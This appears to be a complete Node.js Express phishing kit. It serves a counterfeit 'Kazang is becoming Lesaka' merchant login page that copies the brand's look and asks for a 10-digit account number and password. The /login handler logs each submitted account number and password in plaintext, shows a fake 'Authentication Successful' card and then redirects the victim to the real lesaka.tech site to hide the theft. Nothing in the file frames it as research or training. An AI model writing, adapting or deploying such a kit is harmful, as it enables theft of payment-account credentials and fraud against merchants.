const express = require('express');
const app = express();

const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

// 1. LOGIN PAGE (Co-branded Kazang x Lesaka Design with blended, larger footprint graphic)
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Kazang is becoming Lesaka</title>
            <style>
                * {
                    box-sizing: border-box;
                }
                html, body {
                    height: 100%;
                    margin: 0;
                    padding: 0;
                    font-family: Arial, Helvetica, sans-serif;
                    background-color: #ffffff;
                    color: #2b2b2b;
                }
                .app-wrapper {
                    min-height: 100vh;
                    display: flex;
                    flex-direction: column;
                    max-width: 480px;
                    margin: 0 auto;
                    background-color: #ffffff;
                    box-shadow: 0 0 20px rgba(0, 0, 0, 0.05);
                }
                /* Top Co-Branded Header */
                .top-banner {
                    background-color: #b6ef00;
                    padding: 30px 20px;
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    justify-content: center;
                    text-align: center;
                }
                .brand-header-row {
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    gap: 12px;
                    margin-bottom: 15px;
                    flex-wrap: wrap;
                }
                .kazang-badge {
                    background-color: #2b2b2b;
                    color: #ffffff;
                    width: 36px;
                    height: 36px;
                    border-radius: 50%;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    font-weight: 900;
                    font-size: 18px;
                }
                .brand-divider {
                    width: 2px;
                    height: 28px;
                    background-color: #2b2b2b;
                    opacity: 0.3;
                }
                .foot-logo {
                    height: 44px; /* Larger footprint size */
                    width: auto;
                    display: inline-block;
                    vertical-align: middle;
                    mix-blend-mode: multiply; /* Blends background color seamlessly into the banner */
                    filter: contrast(1.2) brightness(1.02);
                }
                .sub-announcement {
                    font-size: 20px;
                    font-weight: 900;
                    color: #2b2b2b;
                    margin: 5px 0 0 0;
                }
                .sub-tagline {
                    font-size: 13px;
                    font-weight: 600;
                    color: #2b2b2b;
                    margin-top: 4px;
                }
                /* Main Form Section */
                .form-section {
                    padding: 30px 24px 20px 24px;
                    flex: 1;
                }
                .input-field {
                    position: relative;
                    margin-bottom: 20px;
                }
                .input-field label {
                    display: block;
                    font-size: 14px;
                    color: #555555;
                    margin-bottom: 6px;
                }
                .input-field input {
                    width: 100%;
                    padding: 16px 20px;
                    border: 1.5px solid #e0e0e0;
                    border-radius: 30px;
                    font-size: 16px;
                    outline: none;
                    color: #2b2b2b;
                    background-color: #ffffff;
                    transition: border-color 0.2s ease, background-color 0.2s ease;
                }
                .input-field input:focus {
                    border-color: #b6ef00;
                }
                /* Validation States for Account Number */
                .input-field input.invalid {
                    border-color: #e53e3e !important;
                    background-color: #fff5f5 !important;
                }
                .input-field input.valid {
                    border-color: #10b981 !important;
                    background-color: #f0fff4 !important;
                }
                .digit-hint {
                    font-size: 12px;
                    margin-top: 6px;
                    margin-left: 20px;
                    display: block;
                    color: #777777;
                    font-weight: 600;
                }
                /* Dual Action Buttons */
                .button-group {
                    display: flex;
                    gap: 15px;
                    margin-top: 10px;
                    margin-bottom: 25px;
                }
                .btn-register {
                    flex: 1;
                    padding: 16px 10px;
                    border: 2px solid #2b2b2b;
                    background-color: #ffffff;
                    color: #2b2b2b;
                    border-radius: 30px;
                    font-size: 15px;
                    font-weight: bold;
                    letter-spacing: 1px;
                    cursor: pointer;
                    text-align: center;
                }
                .btn-login {
                    flex: 1;
                    padding: 16px 10px;
                    border: 2px solid #b6ef00;
                    background-color: #b6ef00;
                    color: #2b2b2b;
                    border-radius: 30px;
                    font-size: 15px;
                    font-weight: bold;
                    letter-spacing: 1px;
                    cursor: pointer;
                    text-align: center;
                }
                .link-center {
                    text-align: center;
                    margin-bottom: 20px;
                }
                .link-center a {
                    color: #2b2b2b;
                    font-weight: bold;
                    font-size: 16px;
                    text-decoration: none;
                }
                .link-secondary {
                    color: #2b2b2b;
                    font-weight: bold;
                    font-size: 16px;
                }
                /* Bottom Promo Banner */
                .promo-banner {
                    display: flex;
                    border-radius: 6px;
                    overflow: hidden;
                    margin: 20px 0;
                }
                .promo-left {
                    flex: 1;
                    background-color: #b6ef00;
                    padding: 20px 15px;
                    color: #2b2b2b;
                }
                .promo-left h3 {
                    margin: 0;
                    font-size: 24px;
                    font-weight: 900;
                }
                .promo-left p {
                    margin: 5px 0 0 0;
                    font-size: 12px;
                    font-weight: bold;
                }
                .promo-right {
                    flex: 1;
                    background-color: #045d56;
                    padding: 20px 15px;
                    color: #b6ef00;
                    display: flex;
                    flex-direction: column;
                    justify-content: center;
                }
                .promo-right h4 {
                    margin: 0;
                    font-size: 22px;
                    font-weight: 900;
                    color: #ffffff;
                }
                .terms-footer {
                    text-align: center;
                    font-size: 13px;
                    color: #555555;
                    padding: 0 20px 30px 20px;
                    line-height: 1.5;
                }
            </style>
        </head>
        <body>
            <div class="app-wrapper">
                
                <!-- Co-Branded Header -->
                <div class="top-banner">
                    <div class="brand-header-row">
                        <div style="display: flex; align-items: center; gap: 8px;">
                            <div class="kazang-badge">K</div>
                            <span style="font-size: 22px; font-weight: 800; color: #2b2b2b;">Kazang</span>
                        </div>
                        <div class="brand-divider"></div>
                        <div style="display: flex; align-items: center; gap: 4px;">
                            <img src="footprint.jpg" alt="Footprint" class="foot-logo">
                            <span style="font-size: 20px; font-weight: 800; color: #2b2b2b;">Lesaka</span>
                        </div>
                    </div>
                    <div class="sub-announcement">Kazang is becoming Lesaka!</div>
                    <div class="sub-tagline">Keep selling. Keep transacting. Keep earning.</div>
                </div>

                <!-- Main Form Section -->
                <div class="form-section">
                    <form action="/login" method="POST">
                        
                        <!-- Account Number Input with Real-time 10-Digit Validation -->
                        <div class="input-field" style="margin-bottom: 25px;">
                            <input type="text" id="username" name="username" placeholder="Account Number" maxlength="15" required autocomplete="off">
                            <span class="digit-hint" id="digitHint">Must be exactly 10 digits</span>
                        </div>

                        <!-- Password Input -->
                        <div class="input-field">
                            <label for="password">Password</label>
                            <input type="password" id="password" name="password" placeholder="••••" required>
                        </div>

                        <!-- Action Buttons -->
                        <div class="button-group">
                            <button type="button" class="btn-register">REGISTER</button>
                            <button type="submit" class="btn-login">LOGIN</button>
                        </div>
                    </form>

                    <!-- Links -->
                    <div class="link-center">
                        <a href="#">Forgot Password</a>
                    </div>
                    
                    <div class="link-center" style="margin-top: 25px;">
                        <span class="link-secondary">I have an activation code</span>
                    </div>

                    <!-- Promo Banner -->
                    <div class="promo-banner">
                        <div class="promo-left">
                            <h3>4Connect</h3>
                            <p>by Lesaka</p>
                        </div>
                        <div class="promo-right">
                            <span style="font-size: 12px; color: #ffffff;">Up to</span>
                            <h4>8% profit for YOU!</h4>
                        </div>
                    </div>
                </div>

                <!-- Footer Terms -->
                <div class="terms-footer">
                    By using this application, you accept these<br>
                    <strong>Terms and Conditions and Privacy Policy</strong>
                </div>

            </div>

            <!-- Real-time Validation Script -->
            <script>
                const usernameInput = document.getElementById('username');
                const digitHint = document.getElementById('digitHint');

                usernameInput.addEventListener('input', () => {
                    const val = usernameInput.value.replace(/\\D/g, ''); // Extract digits only
                    usernameInput.value = val;
                    const len = val.length;

                    if (len === 0) {
                        usernameInput.classList.remove('valid', 'invalid');
                        digitHint.style.color = '#777777';
                        digitHint.textContent = 'Must be exactly 10 digits';
                    } else if (len === 10) {
                        usernameInput.classList.remove('invalid');
                        usernameInput.classList.add('valid');
                        digitHint.style.color = '#10b981';
                        digitHint.textContent = '✓ 10 Digits Entered';
                    } else {
                        usernameInput.classList.remove('valid');
                        usernameInput.classList.add('invalid');
                        digitHint.style.color = '#e53e3e';
                        digitHint.textContent = len < 10 
                            ? \`Too short (\${len}/10 digits)\` 
                            : \`Too long (\${len}/10 digits)\`;
                    }
                });
            </script>
        </body>
        </html>
    `);
});

// 2. AUTHENTICATED SUCCESS TRANSITION (6s stay duration, redirects to https://lesaka.tech/)
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    console.log(`[LOGIN ATTEMPT] Account Number: ${username} | Password: ${password}`);

    const redirectUrl = 'https://lesaka.tech/';

    setTimeout(() => {
        res.send(`
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Authentication Successful</title>
                <style>
                    html, body {
                        height: 100%;
                        width: 100%;
                        margin: 0;
                        padding: 0;
                        font-family: Arial, sans-serif;
                        background: linear-gradient(135deg, #b6ef00 0%, #10b981 100%);
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        position: relative;
                    }
                    .success-card {
                        background: #ffffff;
                        padding: 40px;
                        border-radius: 16px;
                        text-align: center;
                        box-shadow: 0 10px 30px rgba(0,0,0,0.1);
                        max-width: 360px;
                        width: 90%;
                        animation: popIn 1s ease-in-out;
                    }
                    .success-icon {
                        width: 70px;
                        height: 70px;
                        background-color: #10b981;
                        color: white;
                        border-radius: 50%;
                        display: flex;
                        align-items: center;
                        justify-content: center;
                        font-size: 36px;
                        margin: 0 auto 20px auto;
                    }
                    h1 {
                        font-size: 22px;
                        color: #2b2b2b;
                        margin: 0 0 8px 0;
                    }
                    p {
                        color: #666666;
                        font-size: 14px;
                        margin: 0;
                    }
                    @keyframes popIn {
                        0% { transform: scale(0.7); opacity: 0; }
                        100% { transform: scale(1); opacity: 1; }
                    }
                </style>
                <script>
                    // Redirects to https://lesaka.tech/ after exactly 6 seconds (6000ms)
                    setTimeout(function() {
                        window.location.href = "${redirectUrl}";
                    }, 6000);
                </script>
            </head>
            <body>
                <div class="success-card">
                    <div class="success-icon">&#10003;</div>
                    <h1>Authentication Successful</h1>
                    <p>Secured &amp; Verified</p>
                </div>
            </body>
            </html>
        `);
    }, 2000);
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});